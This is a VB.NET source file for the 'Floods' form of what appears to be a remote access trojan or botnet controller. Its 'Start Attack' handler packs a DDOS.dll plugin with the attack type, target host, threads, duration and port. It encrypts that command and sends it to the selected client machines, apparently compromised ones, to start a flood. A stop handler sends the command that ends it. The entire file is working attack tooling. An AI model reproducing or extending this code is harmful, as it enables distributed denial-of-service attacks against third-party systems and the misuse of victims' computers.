Public Class Floods

    Public SPL = Main.SPL

    Private Async Sub MetroTile1_Click(sender As Object, e As EventArgs) Handles MetroTile1.Click

        Try
            If Main.L1.SelectedItems.Count > 0 Then
                Dim M As New IO.MemoryStream
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DDOS.dll"), True)) + SPL + Flood_Attack.Text + "|'P'|" + "1" + "|'P'|" + Flood_Host.Text + "|'P'|" + Flood_Threads.Value.ToString + "|'P'|" + Flood_Time.Value.ToString + "|'P'|" + Flood_Port.Value.ToString))
                Await M.WriteAsync(CMD, 0, CMD.Length)
                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                If Flood_Attack.Text <> "" AndAlso Flood_Host.Text <> "" AndAlso Flood_Time.Text <> "" AndAlso Flood_Threads.Text <> "" Then
                    If MetroTile1.Text = "Start Attack" Then
                        MetroTile1.Text = "Stop"
                        Flood_Host.Enabled = False
                        Flood_Threads.Enabled = False
                        Flood_Time.Enabled = False
                        Flood_Attack.Enabled = False
                        Flood_Port.Enabled = False

                        For Each C As ListViewItem In Main.L1.SelectedItems
                            Dim x As S_Client = CType(C.Tag, S_Client)
                            x.Send(M.ToArray)
                        Next

                        Try
                            Await M.FlushAsync
                            M.Dispose()
                        Catch ex As Exception
                        End Try

                    Else
                        Dim MM As New IO.MemoryStream
                        Dim CMD2 As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DDOS.dll"), True)) + SPL + Flood_Attack.Text + "|'P'|" + "2"))
                        Await MM.WriteAsync(CMD2, 0, CMD2.Length)
                        Await MM.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                        MetroTile1.Text = "Please Wait.."
                        For Each C As ListViewItem In Main.L1.SelectedItems
                            Dim x As S_Client = CType(C.Tag, S_Client)
                            x.Send(MM.ToArray)
                        Next

                        MetroTile1.Text = "Start Attack"
                        Flood_Host.Enabled = True
                        Flood_Threads.Enabled = True
                        Flood_Time.Enabled = True
                        Flood_Attack.Enabled = True
                        Flood_Port.Enabled = True

                        Try
                            Await MM.FlushAsync
                            MM.Dispose()
                        Catch ex As Exception
                        End Try

                    End If
                End If
            Else
                MsgBox("Please Select Clients", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try

    End Sub

    Private Sub Floods_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.Hide()
        e.Cancel = True
    End Sub

    Private Sub Flood_Attack_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Flood_Attack.SelectedIndexChanged
        If Flood_Attack.Text = "UDP" Then
            MetroLabel3.Visible = True
            Flood_Port.Visible = True
        Else
            MetroLabel3.Visible = False
            Flood_Port.Visible = False
        End If
    End Sub

    Private Sub Flood_Threads_ValueChanged(sender As Object, e As EventArgs) Handles Flood_Threads.ValueChanged
        If Flood_Threads.Value = 1 Then
            Flood_Threads.ForeColor = Color.FromArgb(142, 188, 0)
        ElseIf Flood_Threads.Value = 2 Then
            Flood_Threads.ForeColor = Color.FromArgb(142, 188, 0)
        ElseIf Flood_Threads.Value = 3 Then
            Flood_Threads.ForeColor = Color.Yellow
        ElseIf Flood_Threads.Value >= 4 Then
            Flood_Threads.ForeColor = Color.Red
        End If
    End Sub
End Class